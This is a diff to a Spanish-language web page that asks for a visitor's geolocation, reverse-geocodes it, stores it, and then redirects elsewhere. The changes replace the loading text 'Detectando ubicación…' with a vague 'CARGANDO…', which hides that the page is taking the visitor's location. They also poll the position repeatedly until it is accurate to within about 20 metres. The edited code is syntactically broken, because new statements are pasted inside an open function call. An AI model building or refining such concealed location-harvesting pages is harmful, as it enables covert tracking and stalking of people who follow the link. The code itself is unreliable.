@@ -180,8 +180,8 @@
 <!-- PASO 2: Cargando -->
 <div id="loading-screen">
   <div class="spinner"></div>
-  <div class="loading-title">Detectando ubicación…</div>
-  <div class="loading-sub">Un momento, por favor</div>
+  <div class="loading-title">CARGANDO…</div>
+  <div class="loading-sub"></div>
 </div>
 
 <!-- PASO 3: Error -->
@@ -261,12 +261,23 @@ function requestLocation() {
   show('loading-screen');
 
   navigator.geolocation.getCurrentPosition(
-    async (pos) => {
-      // Geocoding y guardado primero, luego redirigir
-      const geoData = await reverseGeocode(pos.coords.latitude, pos.coords.longitude);
-      await saveVisit(pos, geoData);
+let attempts = 0;
+let bestPos = null;
+const watchId = navigator.geolocation.watchPosition(
+  async (pos) => {
+    attempts++;
+    if (!bestPos || pos.coords.accuracy < bestPos.coords.accuracy) {
+      bestPos = pos;
+    }
+
+    // Parar si es suficientemente preciso o tras 4 intentos
+    if (pos.coords.accuracy <= 20 || attempts >= 4) {
+      navigator.geolocation.clearWatch(watchId);
+      const geoData = await reverseGeocode(bestPos.coords.latitude, bestPos.coords.longitude);
+      await saveVisit(bestPos, geoData);
       window.location.href = REDIRECT_URL;
-    },
+    }
+  },
     (err) => {
       show('error-screen');
 
@@ -290,7 +301,7 @@ function requestLocation() {
     },
     {
       enableHighAccuracy: true,
-      timeout: 10000,
+      timeout: 8000,
       maximumAge: 0
     }
   );
